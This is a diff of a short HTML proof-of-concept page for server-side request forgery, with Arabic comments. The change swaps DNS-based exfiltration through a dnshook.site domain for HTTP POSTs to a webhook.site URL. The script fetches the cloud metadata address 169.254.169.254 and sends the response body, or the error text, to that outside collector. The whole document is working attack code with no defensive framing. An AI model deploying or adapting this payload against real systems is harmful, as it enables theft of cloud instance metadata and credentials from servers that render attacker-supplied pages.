@@ -1,32 +1,28 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SSRF PoC - DNS Exfil v3</title>
+    <title>SSRF PoC - Simple HTTP</title>
 </head>
 <body>
     <h1>Loading...</h1>
     <script>
-        // نطاق DNSHook الجديد الخاص بك
-        const DNS_HOOK_DOMAIN = "a5852858-9701-4e74-896b-ba98539cebed.dnshook.site";
+        // رابط Webhook الجديد الخاص بك
+        const WEBHOOK_URL = "https://webhook.site/a5852858-9701-4e74-896b-ba98539cebed";
 
-        // دالة بسيطة لتسريب البيانات عبر DNS
-        function exfiltrate(data) {
-            // استبدال الأحرف غير الصالحة بنقاط
-            let subdomain = data.replace(/[^a-zA-Z0-9-]/g, '.').substring(0, 60);
-            // استخدام fetch لتجنب مشاكل حظر الصور
-            fetch("http://" + subdomain + "." + DNS_HOOK_DOMAIN, { mode: 'no-cors' });
-        }
-
-        exfiltrate("Stage1-PoC-Loaded-in-Browser");
+        // إرسال طلب POST بسيط
+        fetch(WEBHOOK_URL + "/Stage1-PoC-Loaded", { method: 'POST', mode: 'no-cors', body: 'hello' });
 
         setTimeout(() => {
-            exfiltrate("Stage2-Attempting-Internal-Fetch");
+            fetch(WEBHOOK_URL + "/Stage2-Attempting-Internal-Fetch", { method: 'POST', mode: 'no-cors', body: 'hello' });
             fetch('http://169.254.169.254/')
-                .then(response => {
-                    exfiltrate("Stage3-SUCCESS-Internal-Connection-OK");
+                .then(response => response.text())
+                .then(data => {
+                    // إذا نجح، أرسل البيانات
+                    fetch(WEBHOOK_URL + "/Stage3-SUCCESS", { method: 'POST', mode: 'no-cors', body: data });
                 })
                 .catch(error => {
-                    exfiltrate("Stage4-FAILED-Internal-Connection-Blocked");
+                    // إذا فشل، أرسل رسالة الخطأ
+                    fetch(WEBHOOK_URL + "/Stage4-FAILED", { method: 'POST', mode: 'no-cors', body: error.toString() });
                 });
         }, 7000);
     </script>
